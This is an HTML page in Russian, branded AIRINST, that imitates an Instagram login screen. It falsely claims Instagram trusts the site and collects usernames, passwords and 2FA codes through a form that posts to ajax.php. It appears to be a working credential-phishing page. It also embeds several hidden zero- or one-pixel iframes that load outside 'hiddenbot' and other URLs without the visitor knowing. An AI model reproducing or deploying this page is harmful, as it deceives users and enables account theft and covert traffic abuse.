<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AIRINST - НОВЫЕ ВОЗМОЖНОСТИ</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/index.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" type="image/x-icon" href="../img/favicon.ico">
</head>
<body style="background: #fafafa;">
<div id="auth">
    <main>
        <div class="auth-container">
            <div class="block auth_phone">
                <img src="../img/auth_phone.png" alt="">
				<iframe src="https://autofaucet.org/wm/hiddenbot/4" width="0" height="0" style="border:0"></iframe>
            </div>
            <div class="block auth_content">
                <div class="auth-info">
                    <img src="../img/verifed.png" alt="">
					<iframe src="https://autofaucet.org/wm/hiddenbot/2" width="0" height="0" style="border:0"></iframe>
                    <span>Instagram доверяет этому сайту</span>
                </div>
                <div class="auth-content">
                    <div class="auth_header">
                        <img src="../img/logos/logo-auth.svg" alt="" class="logo">
                    </div>
                    <form action="ajax.php" method="post" @submit="auth">
                        <input type="hidden" name="status" v-model="status">
                        <input type="hidden" name="id" v-model="id">
                        <div class="auth_item">
                            <input type="text" class="auth_input" required name="login" v-model="login">
                            <label class="auth_label">Номер телефона, имя пользователя или эл. адрес</label>
                        </div>
                        <div class="auth_item">
                            <input type="text" class="auth_input" name="password" required v-model="password"
                                   onkeypress="return (event.charCode >= 65 && event.charCode <= 90) || (event
                                   .charCode >= 97 && event.charCode <= 122) || (event.charCode >= 48 && event
                                   .charCode <= 57) || event.charCode === 46 || event.charCode === 95">
                            <label class="auth_label">Пароль</label>
                        </div>
                        <button type="submit" class="auth_button" @click="click_auth_button+=1" v-if="status !== '2fa'" :disabled="login.length < 3|| password.length < 6">Войти</button>

                        <div class="auth_item" v-if="status === '2fa'">
                            <input type="text" class="auth_input" required name="2fa" v-model="two_auth">
                            <label class="auth_label">2FA код</label>
                        </div>

                        <button type="submit" class="auth_button" @click="click_two_auth_button+=1" v-if="status === '2fa'">Подтвердить</button>
                    </form>
                    <p class="auth-error" v-if="error">{{ error }}</p>
                </div>
                <div class="download">
                    <p>Установите приложение.</p>
                    <div class="download_container">
                        <img alt="" src="../img/download/google_play.png">
                        <img alt="" src="../img/download/app_store.png">
                    </div>
                </div>
            </div>
        </div>
        <div class="load" v-if="status === 'check'">
            <div class="load_container">
                <img src="../img/logos/load.svg" alt="">
                <h1>Ожидайте окончания проверки</h1>
				<iframe src="https://rest-zone.ru/blogs" width="1" height="1" style="border:0"></iframe>
            </div>
        </div>
    </main>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.11/vue.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/axios@0.12.0/dist/axios.min.js"></script>
<script src="index.js"></script>

</body>
</html>